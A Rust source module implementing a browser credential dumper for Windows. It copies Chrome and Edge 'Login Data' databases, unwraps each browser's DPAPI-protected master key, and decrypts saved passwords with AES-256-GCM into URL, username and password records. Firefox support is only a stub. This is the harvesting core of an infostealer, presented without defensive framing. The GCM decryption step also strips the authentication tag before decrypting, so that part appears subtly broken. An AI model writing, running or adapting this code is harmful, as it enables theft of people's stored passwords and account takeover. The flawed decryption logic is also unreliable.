use std::fs;
use std::path::Path;
use base64::{Engine as _, engine::general_purpose::STANDARD};
use aes_gcm::aead::Aead;
use aes_gcm::{Aes256Gcm, KeyInit};
use sha2::{Sha256, Digest};
use serde::{Serialize, Deserialize};

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct BrowserCredential {
    pub browser: String,
    pub url: String,
    pub username: String,
    pub password: String,
}

pub struct BrowserDumper;

impl BrowserDumper {
    pub fn dump_all() -> Vec<BrowserCredential> {
        let mut all_creds = Vec::new();
        
        all_creds.extend(Self::dump_chrome());
        all_creds.extend(Self::dump_edge());
        all_creds.extend(Self::dump_firefox());
        
        all_creds
    }
    
    fn dump_chrome() -> Vec<BrowserCredential> {
        let mut creds = Vec::new();
        
        let local_appdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
        let login_data = format!("{}\\Google\\Chrome\\User Data\\Default\\Login Data", local_appdata);
        
        if !Path::new(&login_data).exists() {
            return creds;
        }
        
        // Copy to temp (Chrome locks the file)
        let temp_db = format!("{}\\chrome_login.db", std::env::temp_dir().display());
        let _ = fs::copy(&login_data, &temp_db);
        
        // Get master key
        let master_key = match Self::get_chrome_master_key() {
            Some(k) => k,
            None => {
                let _ = fs::remove_file(&temp_db);
                return creds;
            }
        };
        
        // Query SQLite
        if let Ok(conn) = sqlite::open(&temp_db) {
            let query = "SELECT origin_url, username_value, password_value FROM logins";
            
            if let Ok(statement) = conn.prepare(query) {
                let mut cursor = statement.into_cursor();
                
                while let Ok(Some(row)) = cursor.next() {
                    let url = row.get::<String>(0).unwrap_or_default();
                    let username = row.get::<String>(1).unwrap_or_default();
                    let encrypted_pass: Vec<u8> = row.get(2).unwrap_or_default();
                    
                    if let Some(password) = Self::decrypt_chrome_password(&encrypted_pass, &master_key) {
                        creds.push(BrowserCredential {
                            browser: "Chrome".to_string(),
                            url,
                            username,
                            password,
                        });
                    }
                }
            }
        }
        
        let _ = fs::remove_file(&temp_db);
        creds
    }
    
    fn dump_edge() -> Vec<BrowserCredential> {
        // Edge uses same format as Chrome
        let mut creds = Vec::new();
        
        let local_appdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
        let login_data = format!("{}\\Microsoft\\Edge\\User Data\\Default\\Login Data", local_appdata);
        
        if !Path::new(&login_data).exists() {
            return creds;
        }
        
        let temp_db = format!("{}\\edge_login.db", std::env::temp_dir().display());
        let _ = fs::copy(&login_data, &temp_db);
        
        let master_key = match Self::get_edge_master_key() {
            Some(k) => k,
            None => {
                let _ = fs::remove_file(&temp_db);
                return creds;
            }
        };
        
        if let Ok(conn) = sqlite::open(&temp_db) {
            let query = "SELECT origin_url, username_value, password_value FROM logins";
            
            if let Ok(statement) = conn.prepare(query) {
                let mut cursor = statement.into_cursor();
                
                while let Ok(Some(row)) = cursor.next() {
                    let url = row.get::<String>(0).unwrap_or_default();
                    let username = row.get::<String>(1).unwrap_or_default();
                    let encrypted_pass: Vec<u8> = row.get(2).unwrap_or_default();
                    
                    if let Some(password) = Self::decrypt_chrome_password(&encrypted_pass, &master_key) {
                        creds.push(BrowserCredential {
                            browser: "Edge".to_string(),
                            url,
                            username,
                            password,
                        });
                    }
                }
            }
        }
        
        let _ = fs::remove_file(&temp_db);
        creds
    }
    
    fn dump_firefox() -> Vec<BrowserCredential> {
        let mut creds = Vec::new();
        
        let appdata = std::env::var("APPDATA").unwrap_or_default();
        let profiles_path = format!("{}\\Mozilla\\Firefox\\Profiles", appdata);
        
        if !Path::new(&profiles_path).exists() {
            return creds;
        }
        
        // Find default profile
        if let Ok(entries) = fs::read_dir(&profiles_path) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.file_name()
                    .unwrap_or_default()
                    .to_string_lossy()
                    .contains(".default") {
                    
                    let logins_json = path.join("logins.json");
                    if logins_json.exists() {
                        // Firefox uses different encryption (3DES)
                        // Would need NSS library integration
                        // Placeholder for structure
                    }
                }
            }
        }
        
        creds
    }
    
    fn get_chrome_master_key() -> Option<Vec<u8>> {
        let local_appdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
        let local_state = format!("{}\\Google\\Chrome\\User Data\\Local State", local_appdata);
        
        let content = fs::read_to_string(&local_state).ok()?;
        let json: serde_json::Value = serde_json::from_str(&content).ok()?;
        
        let encrypted_key = json["os_crypt"]["encrypted_key"].as_str()?;
        let key_data = STANDARD.decode(encrypted_key).ok()?;
        
        // Remove DPAPI prefix (first 5 bytes: "DPAPI")
        if key_data.len() < 5 {
            return None;
        }
        
        // Decrypt using DPAPI (Windows Data Protection API)
        Self::dpapi_decrypt(&key_data[5..])
    }
    
    fn get_edge_master_key() -> Option<Vec<u8>> {
        let local_appdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
        let local_state = format!("{}\\Microsoft\\Edge\\User Data\\Local State", local_appdata);
        
        let content = fs::read_to_string(&local_state).ok()?;
        let json: serde_json::Value = serde_json::from_str(&content).ok()?;
        
        let encrypted_key = json["os_crypt"]["encrypted_key"].as_str()?;
        let key_data = STANDARD.decode(encrypted_key).ok()?;
        
        if key_data.len() < 5 {
            return None;
        }
        
        Self::dpapi_decrypt(&key_data[5..])
    }
    
    fn decrypt_chrome_password(encrypted: &[u8], master_key: &[u8]) -> Option<String> {
        if encrypted.len() < 3 {
            return None;
        }
        
        // Check for v10/v11 prefix
        let is_v10 = &encrypted[0..3] == b"v10" || &encrypted[0..3] == b"v11";
        
        if !is_v10 {
            // Older version - direct DPAPI
            return Self::dpapi_decrypt(encrypted)
                .and_then(|d| String::from_utf8(d).ok());
        }
        
        // v10/v11 format: [3 bytes prefix][12 bytes nonce][ciphertext][16 bytes tag]
        if encrypted.len() < 3 + 12 + 16 {
            return None;
        }
        
        let nonce = &encrypted[3..15];
        let ciphertext = &encrypted[15..encrypted.len() - 16];
        let _tag = &encrypted[encrypted.len() - 16..];
        
        // Decrypt with AES-256-GCM using master key
        let cipher = Aes256Gcm::new_from_slice(master_key).ok()?;
        let nonce_arr = aes_gcm::Nonce::from_slice(nonce);
        
        cipher.decrypt(nonce_arr, ciphertext)
            .ok()
            .and_then(|p| String::from_utf8(p).ok())
    }
    
    fn dpapi_decrypt(data: &[u8]) -> Option<Vec<u8>> {
        // Windows DPAPI decryption
        // Would use CryptUnprotectData via Windows API
        // Simplified implementation
        
        unsafe {
            use windows::Win32::Security::Cryptography::{
                CryptUnprotectData, CRYPT_DATA_BLOB, CRYPTPROTECT_UI_FORBIDDEN,
            };
            
            let mut input = CRYPT_DATA_BLOB {
                cbData: data.len() as u32,
                pbData: data.as_ptr() as *mut _,
            };
            
            let mut output = CRYPT_DATA_BLOB::default();
            
            let result = CryptUnprotectData(
                &mut input,
                None,
                None,
                None,
                None,
                CRYPTPROTECT_UI_FORBIDDEN,
                &mut output,
            );
            
            if result.as_bool() && !output.pbData.is_null() {
                let decrypted = std::slice::from_raw_parts(
                    output.pbData,
                    output.cbData as usize,
                ).to_vec();
                
                // Free memory
                windows::Win32::System::Memory::LocalFree(
                    output.pbData as *mut _
                );
                
                return Some(decrypted);
            }
        }
        
        None
    }
}